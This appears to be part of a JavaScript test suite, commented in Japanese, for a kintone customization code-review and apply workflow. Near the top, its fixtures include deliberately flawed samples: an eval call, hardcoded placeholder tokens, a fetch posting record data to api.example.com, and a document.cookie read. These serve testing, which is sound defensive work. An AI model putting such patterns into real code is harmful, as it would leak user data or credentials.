    extraApi: NEW_JS_GOOD.replace("    return event;", "    kintone.api(kintone.api.url('/k/v1/records.json', true), 'GET', { app: 600 });\n    return event;"),
    missingEvent: NEW_JS_GOOD.replace("['app.record.create.change.amount', 'app.record.edit.change.amount']", "'app.record.create.change.amount'"),
    extraEvent: NEW_JS_GOOD.replace("['app.record.create.change.amount', 'app.record.edit.change.amount']", "['app.record.create.change.amount', 'app.record.edit.change.amount', 'app.record.detail.show']"),
    eval: NEW_JS_GOOD.replace("    return event;", "    eval('1 + 1');\n    return event;"),
    secret: NEW_JS_GOOD.replace("    return event;", "    const h = { Authorization: 'Bearer abcdefghijklmnop1234567890' };\n    return event;"),
    token: NEW_JS_GOOD.replace("    return event;", "    const API_TOKEN = 'sk_live_0123456789abcdefABCDEF';\n    return event;"),
    external: NEW_JS_GOOD.replace("    return event;", "    fetch('https://api.example.com/notify', { method: 'POST', body: JSON.stringify({ amount: amount }) });\n    return event;"),
    cookie: NEW_JS_GOOD.replace("    return event;", "    const ck = document.cookie;\n    return event;"),
    globals: "const EVENTS = ['app.record.create.change.amount', 'app.record.edit.change.amount'];\nkintone.events.on(EVENTS, function (event) { event.record['amount'].error = null; return event; });",
    noReturn: NEW_JS_GOOD.replace("    return event;\n", ""),
    duplicate: NEW_JS_GOOD.replace("})();", "  kintone.events.on('app.record.create.change.amount', function (event) { return event; });\n})();"),
    awaitBad: NEW_JS_GOOD.replace("    return event;", "    await Promise.resolve();\n    return event;"),
  };
  const OLD_CHECKS = ['syntax', 'events', 'fields', 'target-fields', 'apis-network', 'planned-events', 'security', 'globals', 'return-event', 'duplicate-handler', 'plan-consistency', 'handler', 'platform'];
  for (const [name, code] of Object.entries(BAD)) {
    const rv = run(code);
    const old = (rv.checks || []).filter(x => OLD_CHECKS.includes(x.name)).map(x => x.name);
    assert(!old.length && rv.status !== 'BLOCKED' && rv.finalCode === code, `簡素化 B: ${name} の候補を Toolkit の形式確認では検査し直さない（生成工程の機械検査の範囲）: ${JSON.stringify(old)} ${rv.status}`);
  }
  //   生成工程の結果の取り込み: block の項目は登録不可、review の項目は承認の欄の確認事項。合格の項目も生成工程の項目（gateway）として残す（Toolkit は判定を弱めない）
  const withGw = (rv, machine) => KTCodeReview.attachBehavior(rv, { version: '1', candidateHash: '0123456789abcdef', passed: !machine.some(x => !x.ok && x.severity === 'block'), machine, requiredEffects: [], behavior: { status: 'not-run', reason: 'no-required-effects', cases: [] } }, { requiredEffects: [], customization: c });
  const synV = withGw(run(BAD.syntax), [{ name: 'syntax', ok: false, severity: 'block', message: '構文解析に失敗しました' }]);
  assert(synV.status === 'BLOCKED' && synV.registration.verdict === 'BLOCKED' && synV.registration.blockers.some(b => b.code === 'syntax'), '生成工程の syntax（block）→ 登録不可');
  const apiV = withGw(run(BAD.extraApi), [{ name: 'syntax', ok: true, severity: 'info', message: '構文解析を通りました' }, { name: 'apis', ok: false, severity: 'review', message: '計画に無い通信 API を使っています: 「kintone.api」' }]);
  assert(apiV.status === 'REVIEW_REQUIRED' && apiV.registration.verdict === 'NEEDS_CONFIRMATION' && apiV.registration.confirmations.some(x => x.code === 'apis') && apiV.checks.some(x => x.name === 'syntax' && x.ok && x.gateway), '生成工程の apis（review）→ 確認事項。合格の項目も生成工程の項目として残す');
  const empty = run('   ');
  assert(empty.status === 'BLOCKED' && check(empty, 'code') && !check(empty, 'code').ok, '空のコード: BLOCKED');
  // 統合の本文（2026-10-18・AI版 契約 20 §20）: Toolkit は合成しない。生成工程の本文が無ければ登録しない（anchor が無い・複数ある・元の本文が変わったなどで合成できない候補は、
  //   生成工程の機械検査の patch が止める。書き込む前に元のファイルが変わったときは、反映の直前の照合 JS_SOURCE_CHANGED が止める。ai-js-executor §50）
  const hy = reviewPlan(PLAN_HYBRID);
  const runP = (patch, src = SRC, g = {}) => KTCodeReview.review({ generated: genPatch(patch, g), customization: hy.plan.customizations[0], plan: hy.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: src });
  const noBody = runP(PATCH_GOOD, SRC, { body: null });
  assert(noBody.status === 'BLOCKED' && !check(noBody, 'patch').ok && /生成工程が既存ファイルに統合した本文を返していません/.test(check(noBody, 'patch').message) && !noBody.finalCode, '生成工程の本文が無い統合: BLOCKED（Toolkit が合成して補わない）');
  const anchorLine = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'INSERT_AFTER', anchor: "    const record = event.record;", content: PATCH_ADDED }] });
  assert(anchorLine.status === 'OK' && anchorLine.diff.added === 3 && anchorLine.diff.removed === 0 && anchorLine.finalCode === gwFakeBody(FIELD_ON_OFF, { operations: [{ type: 'INSERT_AFTER', anchor: "    const record = event.record;", content: PATCH_ADDED }] }), '別の位置への統合: 書き込む本文は生成工程の本文のまま・差分は本文から数える');
  const noSrc = runP(PATCH_GOOD, null);
  assert(noSrc.status === 'BLOCKED' && /JS_SOURCE_UNAVAILABLE/.test(check(noSrc, 'patch').message), '統合先の本文が無い: BLOCKED（JS_SOURCE_UNAVAILABLE）');
  const replace = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'REPLACE', anchor: "    if (record['ステータス'].value === '承認待ち') {", content: "    if (record['ステータス'] && (record['ステータス'].value === '承認待ち' || record['ステータス'].value === '完了')) {" }] });
  assert(replace.status === 'REVIEW_REQUIRED' && check(replace, 'patch-removal') && !check(replace, 'patch-removal').ok && replace.diff.removed === 1 && replace.diff.added === 1, 'REPLACE で既存行を置き換える: 既存処理が失われないか確認（確認が必要。書き込む本文と元の本文の差分から決める）');
  const crlf = runP(PATCH_GOOD, { ...SRC, text: FIELD_ON_OFF.replace(/\n/g, '\r\n') });
  assert(crlf.finalCode === genPatch().body && !crlf.finalCode.includes('\r') && /元のファイルの改行（CRLF）は LF になります/.test(check(crlf, 'patch').message) && crlf.diff.removed === 0, '元が CRLF でも書き込む本文は生成工程の LF の本文のまま。改行が LF になることを書く（差分の行には出ない）');
  const otherStrategy = KTCodeReview.review({ generated: genNew(NEW_JS_GOOD, { strategy: 'PLUGIN_CANDIDATE' }), customization: hy.plan.customizations[0], plan: hy.plan, data: INPUTS.data, scan: INPUTS.scan });
  assert(otherStrategy.status === 'BLOCKED' && check(otherStrategy, 'strategy') && !check(otherStrategy, 'strategy').ok, 'PLUGIN_CANDIDATE 等はコード生成の対象外: BLOCKED');
  // C-1 第 2 段（設計 §0d.4）: 既存 JS と同じフィールドを扱うだけで確認にする判定（旧 existing-conflict）はコードの確認では行わない。
  // 計画の段階の同じフィールドを扱う情報（JS_SHARED_FIELD。簡素化 §5 で競合・要確認から情報に変えた。§51 の上の期待）は残る。実際の競合は生成工程の回帰で守る:
  // Gateway worker/test/cases/required-effects.mjs「§0d.1 の 2: 同じ platform の既存 JS（送ったもの）がそのイベントを登録する…→ behavior（existing-same-event）」・
  // 「レビュー S11: 既存 JS の error で候補の編集不可が取り消される → not-run（existing…）」、隔離環境 sandbox/test/run.mjs「R13 別ファイル: 既存の disabled が候補の error で取り消される」
  // 実機（Phase 17 E2E C）: モバイル JS への統合（patch。追加分に handler なし）では、PC の既存 JS は競合にならない（画面ごとの判定は生成工程の必須の効果。簡素化 B で Toolkit の platform を削除した）
  const MOBILE_LOCK_SRC = ['(function () {', "  'use strict';", "  kintone.events.on('mobile.app.record.edit.show', function (event) {", "    event.record['owner'].disabled = true;", '    return event;', '  });', '})();'].join(String.fromCharCode(10));
  const mobCust = { customizationId: 'C1', requirement: '承認待ちは金額も編集不可', strategy: 'EXTEND_EXISTING_JS', platform: ['mobile'], events: ['mobile.app.record.edit.show'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [], existingFiles: [{ name: 'mobileLock.js', target: 'mobile' }] };
  const mobPatch = { baseHash: hash(MOBILE_LOCK_SRC), operations: [{ type: 'INSERT_AFTER', anchor: "    event.record['owner'].disabled = true;", content: ["    if (event.record['ステータス'].value === '承認待ち') {", "      event.record['amount'].disabled = true;", '    }'].join(String.fromCharCode(10)) }] };
  const mobRv = KTCodeReview.review({ generated: { strategy: 'EXTEND_EXISTING_JS', targetFile: 'mobileLock.js', summary: 'm', code: mobPatch.operations[0].content, patch: mobPatch, body: gwFakeBody(MOBILE_LOCK_SRC, mobPatch), events: ['mobile.app.record.edit.show'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [] }, customization: mobCust, plan: PLAN_HYBRID.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: { name: 'mobileLock.js', target: 'mobile', text: MOBILE_LOCK_SRC } });
  assert(mobRv.status === 'OK' && !check(mobRv, 'platform'), `モバイル JS への統合: PC の fieldOnOff.js は競合にならず（確認に出ない）、統合した本文を作れる（${(mobRv.checks || []).filter(c => !c.ok).map(c => c.name).join(',') || 'すべて ✓'}）`);
}

// =========================================================
console.log('\n--- §53. AI Workspace: Hybrid の計画 → 最終案（生成と検証）→ 右の「コード」の確認・Diff / コピー → 承認 → 反映 ---');
// C-1 第 3 段（2026-10-08）: 古い確認の流れ（依頼 → すぐ計画 → 変更案のカード → 仕様の確定 →「コードを作って」→ コードのカード）は削除した。
//   この節は新しい流れ（依頼 → 仮案 → 採用 → 計画 → 生成と検証（生成工程）→ 最終案 → 承認 → 反映）の上で、維持する機能
//   （Toolkit の確認・右の「変更内容」「コード」・Generator Context・コピー・説明・Q&A・反映と結果の確認）を試す。2026-10-19: 右の「確認結果」のタブは廃止した
//   共有の部品（tests/helpers/new-flow.js）: K.mount（画面と偽 client。health に proposal）・K.adoptOnScreen（台本の 4 発言で最終案まで）・K.fakeVerification（生成工程の検証結果）
const K = createNewFlowKit(T);
/** 生成工程が必須の効果の検証に対応している接続先（health の customization-generator.verification に印） */
const HEALTH_V = (() => { const h = K.clone(K.HEALTH); h.registry.toolkit['customization-generator'].verification = ['requirementId', ...K.GEN_EFFECT_FEATURES, ...K.GEN_CURRENT_FEATURES]; return h; })();
/** 新しい流れの生成工程は必須の効果（effects・condition）を固定して依頼する。§51・§52 の cust() に、完了で金額を編集不可にする効果を足したもの */
const CUST_LOCK = (o = {}) => cust({ fields: [{ code: 'ステータス', access: 'READ' }, { code: 'amount', access: 'CONTROL', condition: 'ステータス in ("完了")', effects: ['lock'] }], ...o });
const PLAN_HYBRID_V = planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [CUST_LOCK()], solution: 'HYBRID' });
/**
 * 画面（K.mount）に、この節の入力（fieldOnOff.js あり）・計画・生成を差し込む。
 *   planResponse = 計画の AI の応答（関数なら ctx から）/ generatedFor = 生成のコード（例外を投げれば Gateway のエラー）/ has = 偽の検証で「処理あり」とする効果
 *   fails = 模擬テストで不合格にする効果（`フィールド|効果`）/ verify = 偽の検証結果を本物の生成工程と同じ形に足す関数（機械検査の項目など）
 */
function mountV({ inputs = INPUTS, planResponse = PLAN_HYBRID_V, generatedFor = null, health = HEALTH_V, has = { amount: ['lock'] }, fails = [], failMsg = undefined, verify = null, downloadFails = null } = {}) {
  const calls = { plan: [], generate: [] };
  const copies = [], downloads = [];
  const mock = makeKintoneMock(inputs.data, { jsSources: [{ name: 'fieldOnOff.js', target: 'desktop', text: FIELD_ON_OFF }] });
  //   簡素化（2026-10-17）: 統合先・同じ画面の本文を取れない素材は、動作テスト環境のファイルの取得の失敗で作る（作業の基準が本文を持たない。以前の d.loadJsSource の差し替えは削除した）
  if (downloadFails) { const dl = mock.api.downloadFile.bind(mock.api); mock.api.downloadFile = async (k) => { const f = mock.st.files.get(k); if (f && downloadFails(f.name)) throw Object.assign(new Error('ファイルが見つかりません'), { code: 'GAIA_IL23', status: 404 }); return dl(k); }; }
  const planImpl = ({ ctx, requestId }) => {
    calls.plan.push({ ctx });
    const resp = typeof planResponse === 'function' ? planResponse(ctx) : planResponse;
    const v = KTAiClient.validatePlan(resp, ctx);
    if (!v.ok) throw new Error(JSON.stringify(v.errors));
    return { ...v.normalized, requestId, clientWarnings: v.warnings };
  };
  const generateImpl = async ({ ctx, requestId }) => {
    calls.generate.push({ ctx });
    const g = generatedFor ? generatedFor(ctx) : genPatch({ ...PATCH_GOOD, baseHash: ctx.existingFile?.hash || PATCH_GOOD.baseHash }, {}, ctx.existingFile ? ctx.existingFile.source : FIELD_ON_OFF);
    const resp = genResponse(ctx, g);
    //   簡素化 B（2026-10-17）: 本物の Gateway と同じく、検証結果に候補の指紋（Gateway と同じ計算）を入れる
    resp.verification = K.fakeVerification({ code: g.code, has, fails, ...(failMsg ? { failMsg } : {}) }, (ctx.verification && ctx.verification.requiredEffects) || [], { candidateHash: gwHashOfCtx(ctx, resp.generated) });
    if (verify) resp.verification = verify(resp.verification);
    const v = KTAiClient.validateGenerated(resp, ctx);
    if (!v.ok) throw new KTAiClient.AiClientError({ code: v.errors[0].code, message: v.errors[0].message, requestId });
    return { ...v.normalized, requestId, clientWarnings: v.warnings };
  };
  const m = K.mount({ health, planImpl, generateImpl, extra: { getInputs: () => inputs, copyText: async (t) => { copies.push(t); return true; }, downloadText: (name, text) => downloads.push({ name, text }), executor: { api: mock.api, appId: '310' } } });
  return Object.assign(m, { calls2: calls, copies, downloads, mock, types: () => m.msgs().map(x => x.type) });
}
/** 2026-10-06: 会話に見える文（タグと data 属性を除く）。内部の番号（C1・v1 など）が出ていないことを確かめる */
const textOf = (html) => String(html).replace(/<[^>]*>/g, '');
const writes = (m) => m.mock.calls.filter(c => !c.startsWith('GET'));
/** 最終案のカード（会話の最後の FINAL）の本文 */
const finalText = (m) => { const f = m.msgs().filter(x => x.type === 'FINAL').pop(); return f ? K.stripC(K.finalHtml({ c: m.conv(), finals: () => [f] }, f)) : ''; };
const clickCode = (m, id) => m.$('kt-ai-pane-code').dispatch({ type: 'click', target: { id } });
{
  const m = mountV();
  await ticks();
  const v = await K.adoptOnScreen(m);
  assert(v && v.final && v.fromDraft && m.calls2.plan.length === 1 && m.calls2.generate.length === 1 && v.generated.C1.status === 'verified' && FS.readyOf(v) === true, `前提: 仮案を採用すると計画 1 回・生成 1 回で最終案まで進み、承認できる: ${JSON.stringify({ final: !!(v && v.final), plan: m.calls2.plan.length, gen: m.calls2.generate.length })}`);
  assert(v.plan.solution === 'HYBRID' && v.plan.customizations.length === 1 && v.review && v.review.hybrid.solution === 'HYBRID', '計画の版: solution HYBRID・customizations 1・Toolkit Review に hybrid');
  const html = m.chat();
  const fin = finalText(m);
  // 会話の要約は最終案のカード 1 枚（設定の手順と JavaScript の反映先）。内訳は右の「変更内容」の要約（対象・何が変わるか・JavaScript の状態）
  assert(/設定の手順 1 件（Toolkit から自動で反映できるのは 1 件）/.test(m.$('kt-ai-change-summary').innerHTML) && /既存の「fieldOnOff\.js」に統合/.test(m.$('kt-ai-change-summary').innerHTML) && /対象：一覧／JavaScript（PC：編集画面）/.test(m.$('kt-ai-change-summary').innerHTML), '最終案のカード: 設定の手順 1 件と JavaScript（fieldOnOff.js に統合）。右の「変更内容」の要約に対象（一覧／JavaScript の画面）');
  // Phase 19: カスタマイズの詳細（統合先・イベント・フィールド・不足する理由）は右の「変更内容」の実装仕様カードだけ。会話にはイベント・フィールドの内訳を出さない
  const specPane = m.$('kt-ai-spec').innerHTML;
  assert(!/kt-ai-customization-card/.test(html) && !/app\.record\.edit\.show/.test(html) && !/amount（CONTROL）/.test(html) && /kt-ai-spec-card/.test(specPane) && /✎ fieldOnOff\.js を変更/.test(specPane) && /標準で不足/.test(specPane) && /編集画面/.test(specPane) && /「[^」]+」（制御）/.test(specPane) && !/app\.record\.|amount（CONTROL）|<b>C1<\/b>/.test(specPane), '実装仕様カード（右の「変更内容」）: ✎ fieldOnOff.js を変更・画面・フィールド（名前と扱い）・不足する理由（§0e.3: イベント名・コード・扱いの英語・番号 C1 は出さない）。会話にはイベント・フィールドの内訳を出さない');
  assert(!/C1|v1/.test(textOf(html)), '会話（最終案のカード）に内部の番号（C1・版の v1）を出さない');
  //   2026-10-19: 右の「確認結果」のタブ（計画の時点の確認結果の描き直し・Hybrid の一覧）は廃止した。標準設定と JavaScript は右の「変更内容」の「何が変わるか」の行、
  //   JavaScript の今の状態は「JavaScript の状態」、反映の件数は反映の分類の 1 か所（「反映する内容」の「設定の手順 N 件（…自動で反映できるのは N 件）」）
  const sumPane = m.$('kt-ai-change-summary').innerHTML;
  assert(!/kt-ai-pane-review|kt-ai-review-result/.test(m.host.innerHTML) && !/data-act="generate"|コードを作る/.test(sumPane + html) && /JavaScript の状態/.test(sumPane), '［コードを作る］は無い（計画の時点の状態から作成の案内を出さない）。JavaScript の今の状態は右の「変更内容」の「JavaScript の状態」');
  // 2026-10-06: Toolkit の確認のカードは会話に出さない
  assert(!/kt-ai-review-card/.test(html) && !/実行可能な標準設定|コード生成可能/.test(sumPane + html) && (sumPane.match(/自動で反映できるのは/g) || []).length === 1, 'Toolkit の確認: 会話にカードを出さない。反映の件数は反映の分類の 1 か所だけ（安全区分から別に数えた件数は出さない）');
  assert(/何が変わるか（Toolkit が確かめた変更前後）/.test(sumPane) && (sumPane.match(/<li><span>/g) || []).length === 2 && /<li><span>[^<]*（JavaScript）/.test(sumPane) && /<li><span>一覧「承認済み」を追加/.test(sumPane) && !/kt-ai-review-hybrid|実装計画（標準設定 ＋ JavaScript）/.test(sumPane + m.$('kt-ai-plan-result').innerHTML), '標準設定と JavaScript は「何が変わるか」の行（Hybrid の一覧を別に作らない）');
  assert(/登録済み JS/.test(m.$('kt-ai-header').innerHTML) && /fieldOnOff\.js/.test(m.$('kt-ai-header').innerHTML), 'ヘッダー詳細: 登録済み JS（既存カスタマイズ設定）');
  // 「これで進めて」はコードを作らない。承認の前は最終案の承認へ案内する（C-1 第 3 段: 手順ごとの承認・仕様の確定へは案内しない）
  const pv = await m.panel.send('これで進めて');
  assert(pv.intent === KTAiConversation.INTENT.REQUEST_PREVIEW && m.calls2.generate.length === 1 && m.msgs().some(x => x.data?.kind === 'preview-needs-approval') && /［動作テスト環境へ反映］/.test(m.chat()), '「これで進めて」: REQUEST_PREVIEW。コードは生成しない・承認の前は最終案のカードの［動作テスト環境へ反映］へ案内');
  // 説明（EXPLAIN_CUSTOMIZATION）
  const ex = await m.panel.send('C1 はなぜ JavaScript が必要？');
  assert(ex.intent === KTAiConversation.INTENT.EXPLAIN_CUSTOMIZATION && m.calls.ask.length === 1 && m.calls.ask[0].ctx.planContext?.kind === 'EXPLAIN_PLAN' && /JavaScript カスタマイズの説明/.test(m.chat()), 'EXPLAIN_CUSTOMIZATION: planContext（EXPLAIN_PLAN）で説明だけ。計画は変えない');
  assert(m.conv().activePlan() === v && m.calls2.plan.length === 1 && m.calls2.generate.length === 1, '説明では Planner / Generator を呼ばない');
  // Generator Context（最終案のパイプラインが生成工程へ送ったもの）
  const gctx = m.calls2.generate[0].ctx;
  assert(gctx.contextVersion === 'customization-1' && gctx.customization.customizationId === 'C1' && gctx.existingFile?.name === 'fieldOnOff.js' && gctx.existingFile.source === FIELD_ON_OFF && gctx.facts === undefined, 'Generator Context: C1 ＋ 統合先の本文（解析結果から）。アプリ全体の facts なし');
  const entry = m.panel.generated('C1');
  assert(entry && entry === v.generated.C1 && entry.generated.strategy === 'EXTEND_EXISTING_JS' && entry.review.status === 'OK' && entry.existingSource?.text === FIELD_ON_OFF, '生成結果を版に保持: Toolkit Code Review OK');
  assert(writes(m).length === 0, 'コード生成（最終案まで）で kintone への書き込みは 0 件');
  // 右の「コード」: コード / Diff / 検査の内訳 / 登録ボタン（会話のコードのカードは削除した。右の「コード」は残す）
  m.panel.showCode('C1', { view: 'code' });
  assert(m.panel.drawerState().open && m.panel.drawerState().pane === 'code' && m.$('kt-ai-code-view').textContent === entry.review.finalCode && m.$('kt-ai-code-view').style.display === '' && m.$('kt-ai-diff-view').style.display === 'none', '右の「コード」: 最終コード');
  assert(/✎ 既存 JS を変更/.test(m.$('kt-ai-code-head').innerHTML) && !/検査を通過|採用不可|登録：/.test(m.$('kt-ai-code-head').innerHTML) && /既存ファイルへの統合/.test(m.$('kt-ai-code-review').innerHTML) && /元のコードは保持/.test(m.$('kt-ai-code-review').innerHTML) && /＋3 行 \/ −0 行/.test(m.$('kt-ai-code-review').innerHTML) && /構文/.test(m.$('kt-ai-code-review').innerHTML) && !/Patch|Security/.test(m.$('kt-ai-code-review').innerHTML), '右の「コード」: 見出し（方針とファイル。判定の札は出さない: 判定は右の「変更内容」の「JavaScript の状態」と最終案。2026-10-19）と Code Review の一覧（既存ファイルへの統合 ＋3 / −0 行・元のコードは保持。検査名は日本語）');
  //   簡素化（2026-10-17）: 右の「コード」の登録ボタン（仮案から作っていない計画のときだけ出ていた）は要素ごと削除した（出さないことの確かめは不要）
  m.panel.showCode('C1', { view: 'diff' });
  assert(m.$('kt-ai-diff-view').style.display === '' && /^\+\s*if \(record\['ステータス'\] && record\['ステータス'\]\.value === '完了'\)/m.test(m.$('kt-ai-diff-view').textContent) && / {0,}kintone\.events\.on/.test(m.$('kt-ai-diff-view').textContent), '差分 → Before / After（追加行は +・既存行は保持）');
  // コピー（右の「コード」のボタン）
  await clickCode(m, 'kt-ai-code-copy');
  assert(m.copies.length === 1 && m.copies[0] === entry.review.finalCode && m.copies[0].includes("value === '完了'") && m.copies[0].startsWith('(function () {'), '［コードをコピー］: 最終コード（既存 ＋ 追加）');
  await clickCode(m, 'kt-ai-diff-copy');
  assert(m.copies.length === 2 && /^\+/m.test(m.copies[1]), '［差分をコピー］');
  await clickCode(m, 'kt-ai-cplan-copy');
  const cplan = JSON.parse(m.copies[2]);
  assert(cplan.customization.customizationId === 'C1' && cplan.generated.strategy === 'EXTEND_EXISTING_JS' && cplan.codeReview.status === 'OK' && cplan.provenance.planId === v.planId && cplan.provenance.customizationId === 'C1' && cplan.provenance.requestId, '［Plan JSON］: Customization Plan ＋ 生成要約 ＋ Code Review ＋ 出所（provenance）');
  await clickCode(m, 'kt-ai-code-download');
  assert(m.downloads.length === 1 && m.downloads[0].name === 'fieldOnOff.js' && m.downloads[0].text === entry.review.finalCode, 'コードペイン: ファイルとして保存（登録はしない）');
  // Q&A は影響なし
  const qa = await m.panel.send('このフィールドは何に使ってる？');
  assert(qa.intent === KTAiConversation.INTENT.ASK && m.calls.ask.length === 2 && !m.calls.ask[1].ctx.planContext, 'Q&A は影響なし（ASK → assistant-qa。planContext なし）');
  // 最終案の承認と反映（§0e.1: ［動作テスト環境へ反映］1 回。標準設定（Preview Executor は JS を反映しない）→ JavaScript の登録の順）
  await K.waitUntil(() => m.panel.finalPrecheck().status === 'ready', 60);
  { const pre = m.panel.finalPrecheck();
    assert(m.panel.applyHold() === null && pre.items.settings.length === 1 && pre.items.files.join() === '✎ fieldOnOff.js（PC）既存ファイルを更新（同じ位置）' && pre.items.manual.length === 0 && !v.approval && writes(m).length === 0, '承認の欄: 標準設定 1 件（一覧）・JavaScript 1 件（既存ファイルの更新）。JS の手順は「自動では反映しない手順」に数えない・まだ承認しない・書き込み 0'); }
  const ar = await K.applyOnScreen(m);
  assert(ar.button && !ar.button.disabled && v.approval && ar.run && ar.run.ok, '前提: 最終案のカードの［動作テスト環境へ反映］1 回で承認した（止める理由は無い）');
  const ex2 = m.panel.executorState().execution;
  assert(ex2 && ex2.status === 'DONE' && ex2.steps.find(s => s.stepId === 'P1')?.status === 'VERIFIED' && ex2.steps.find(s => s.stepId === 'P2')?.status === 'UNSUPPORTED', 'Preview Executor: P1（一覧）は VERIFIED・JS の P2 は UNSUPPORTED（反映しない）');
  { const w = writes(m); const k = w.indexOf('POST file');
    assert(k > 0 && !w.slice(0, k).some(c => /customize/.test(c)) && w.slice(k).join() === 'POST file,PUT customize' && m.panel.jsExecState().stage === 'done', `標準設定の書き込み（Executor）に customize.json は無く、その後に JavaScript を登録する（${w.join(',')}）`); }
  assert(/標準設定: ✓ 1 件を反映（反映後の確認で一致）/.test(ar.card) && /JavaScript: ✎ fieldOnOff\.js（PC） を登録/.test(ar.card) && ar.cardCount === 1 && !/VERIFIED/.test(textOf(m.chat())), '反映のカード 1 枚: 標準設定 ✓ 1 件・JavaScript を登録（VERIFIED の語は会話に出さない）');
  assert(m.panel.generated('C1') === entry, '生成結果は計画の版に保持されたまま');
}

// =========================================================
console.log('\n--- §53-2. 複数のカスタマイズ / カスタマイズの修正 / 生成不可 / BLOCKED なコード ---');
{
  // 複数のカスタマイズ: 最終案のパイプラインが全部を生成工程に依頼する（どれか聞くカードは削除した）。C2 の要件に合わない patch は登録不可
  const C2 = cust({ customizationId: 'C2', requirement: '承認済みなら担当者も編集できなくする', fields: [{ code: 'ステータス', access: 'READ' }, { code: 'owner', access: 'CONTROL', condition: 'ステータス in ("完了")', effects: ['lock'] }] });
  const twoC = planOf({ steps: [STD_STEP(), JS_STEP(), mkStep('P3', 'CUSTOMIZATION_REQUIRED', 'JS', 'fieldOnOff.js', { customizationId: 'C2' }, { title: '承認済みなら担当者も編集不可（JavaScript）', solution: 'CUSTOMIZATION' })], customizations: [CUST_LOCK(), C2], solution: 'HYBRID' });
  const m = mountV({ planResponse: (ctx) => (ctx.revision ? planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [CUST_LOCK({ platform: ['desktop', 'mobile'], events: ['app.record.edit.show', 'mobile.app.record.edit.show'] })], solution: 'HYBRID', requestId: 'pl-h2' }) : twoC) });
  await ticks();
  const v = await K.adoptOnScreen(m);
  assert(m.calls2.generate.length === 2 && m.calls2.generate.map(g => g.ctx.customization.customizationId).join(',') === 'C1,C2' && !m.msgs().some(x => x.data?.kind === 'customization-choices'), `複数の生成可能なカスタマイズ: 最終案のパイプラインが C1・C2 を 1 回ずつ生成工程に依頼する（どれか聞くカードは無い）: ${m.calls2.generate.map(g => g.ctx.customization.customizationId).join(',')}`);
  const c2 = m.panel.generated('C2');
  //   簡素化 B（2026-10-17）: 計画の処理が無いこと（Toolkit の planned-fields）・計画に無いフィールドの書き換え（target-fields）は Toolkit から削除した。
  //   owner の処理が無いことは生成工程の必須の効果（missing）で登録不可になる（計画に無い書き換えは生成工程の plan-consistency。生成した AI の申告で見る）
  assert(c2.review.status === 'BLOCKED' && c2.review.registration.verdict === 'BLOCKED' && c2.review.checks.some(x => x.name === 'required-effects' && !x.ok && x.severity === 'block' && /owner/.test(x.message)) && !c2.review.checks.some(x => x.name === 'planned-fields' || x.name === 'target-fields'), `C2 なのに amount を制御する patch: owner の処理が無い → 生成工程の必須の効果の missing で登録不可: ${JSON.stringify(c2.review.checks.filter(x => !x.ok).map(x => x.name))}`);
  const fin = finalText(m);
  assert(FS.readyOf(v) === false && v.generated.C1.status === 'verified' && v.generated.C2.status !== 'verified' && /確認できないこと／反映を止めている理由/.test(fin) && /要件未達（「担当者」: 編集できないようにする）/.test(fin) && !/C1|C2/.test(textOf(m.chat())), `最終案のカード: C2 は要件未達で承認できない（C1 は検証済み。内部の番号は会話に出さない）: ${fin.slice(fin.indexOf('実現できない点'), fin.indexOf('実現できない点') + 160)}`);
  m.panel.showCode('C2', { view: 'code' });
  assert(/×[^<]*owner/.test(m.$('kt-ai-code-review').innerHTML) && !/採用不可|登録：/.test(m.$('kt-ai-code-head').innerHTML), `右の「コード」: 止める理由（× の検査の行。owner の処理が無い）を出す。判定の札は出さない（判定は最終案のカードと右の「変更内容」の「JavaScript の状態」）: ${m.$('kt-ai-code-review').innerHTML.replace(/<[^>]+>/g, ' ').slice(0, 200)}`);
  // 計画の修正（カスタマイズの対象をモバイルにも）→ 新しい版。前の版の生成結果は新しい版に引き継がない
  m.panel.showCode('C1', { view: 'code' });
  const rv = await m.panel.send('金額のロックはモバイルでも動くようにして'); await ticks(8);
  const v2 = m.conv().activePlan();
  assert(rv.intent === KTAiConversation.INTENT.REVISE_PLAN && m.calls2.plan[1] && m.calls2.plan[1].ctx.revision && v2.planId === v.planId && v2.version > v.version, 'カスタマイズの修正 → REVISE_PLAN → 新しい版');
  const g2 = m.panel.generated('C1', v2);
  assert(v2.plan.customizations[0].platform.join() === 'desktop,mobile' && v2.review.steps.find(r => r.solution === 'CUSTOMIZATION')?.codeGeneration?.supported === true && g2 !== v.generated.C1 && !(g2 && g2.generated) && !m.panel.generated('C2', v2), '新しい版: platform desktop / mobile。前の版の生成コードは新しい版に引き継がない（新しい版の最終案のパイプラインで作り直す）');
  // 2026-10-06: 同じ計画の新しい版になったら、前の版のコードは右の「コード」に残さない（古いコードを最新として見せない・登録しない）
  assert(/変更案が新しくなったため、前の変更案のコードは表示していません。/.test(m.$('kt-ai-code-head').innerHTML) && m.$('kt-ai-code-view').style.display === 'none' && m.$('kt-ai-diff-view').style.display === 'none', '新しい版: 右の「コード」から前の版のコードを消し、その旨を出す（登録ボタンも出さない）');
  assert(m.calls2.plan[1].ctx.revision.previousPlan && JSON.stringify(m.calls2.plan[1].ctx.revision.previousPlan).includes('C1'), 'revision の previousPlan に customization（C1）が含まれる');
}
{
  // 生成不可（PC / モバイル未定）: 生成工程を呼ばず、最終案は承認できない
  const m = mountV({ planResponse: planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [CUST_LOCK({ platform: [] })], solution: 'HYBRID' }) });
  await ticks();
  const v = await K.adoptOnScreen(m);
  const sumU = m.$('kt-ai-change-summary').innerHTML;
  assert(/要確認/.test(m.$('kt-ai-spec').innerHTML) && /Toolkit ではコードを作れません（PC かモバイルかが未定）/.test(sumU) && /PC かモバイルかは未定/.test(sumU), `PC / モバイル未定: 右の「変更内容」の仕様は「要確認」・「反映できないこと」に作れない理由・対象に「PC かモバイルかは未定」: ${K.stripC(sumU).slice(0, 400)}`);
  //   簡素化 D: 「全体」の件数（安全区分から別に数えた件数）は削除した。生成できないことは「反映できないこと」の理由で出す
  assert(!/コード生成可能/.test(sumU) && !/kt-ai-review-card/.test(m.chat()), 'JS のコード生成の可否: 別に数えた件数は出さない・会話に確認のカードを出さない');
  const fin = finalText(m);
